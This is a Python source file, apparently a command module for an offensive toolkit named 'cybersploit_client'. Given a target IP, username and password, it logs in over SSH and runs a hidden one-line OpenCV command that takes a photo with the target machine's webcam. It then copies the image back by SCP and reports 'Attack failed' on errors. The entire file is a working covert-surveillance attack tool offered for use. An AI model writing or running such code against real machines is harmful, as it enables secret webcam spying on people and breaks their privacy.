import sys
import os
import getpass
import paramiko

import scp

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))

from cybersploit_client.commands import Command


def camera_capture(target_ip: str, username: str, password: str):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, username=username, password=password)

        print(f"Connected to {target_ip}")

        capture_command = (
            "python3 -c 'import cv2, time; "
            "cam = cv2.VideoCapture(0); "
            "time.sleep(0.5); "
            "[cam.read() for _ in range(20)]; "
            "s, img = cam.read(); "
            "cv2.imwrite(\"remote_snap.jpg\", img); "
            "cam.release()'"
        )

        print("Executing remote capture...")
        stdin, stdout, stderr = ssh.exec_command(capture_command)
        stdout.channel.recv_exit_status()

        with scp.SCPClient(ssh.get_transport()) as scp_client:
            scp_client.get("remote_snap.jpg", "captured_from_target.jpg")

        print("Success! Photo saved as captured_from_target.jpg")
        ssh.close()

    except Exception as e:
        print(f"Attack failed: {e}")


class CameraCapture(Command):
    """
    Capture a photo from the target machine's camera via SSH.
    Usage: camera_capture <target_ip> <username>
    """

    def do_command(self, lines: str, *args):
        parts = lines.split()
        if len(parts) < 2:
            print("Usage: camera_capture <target_ip> <username>")
            return
        target_ip, username = parts[0], parts[1]
        password = getpass.getpass(f"Enter password for {username}@{target_ip}: ")
        camera_capture(target_ip, username, password)


command = CameraCapture

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 camera_capture.py <target_ip> <username>")
        sys.exit(1)
    pw = getpass.getpass(f"Enter password for {sys.argv[2]}@{sys.argv[1]}: ")
    camera_capture(sys.argv[1], sys.argv[2], pw)
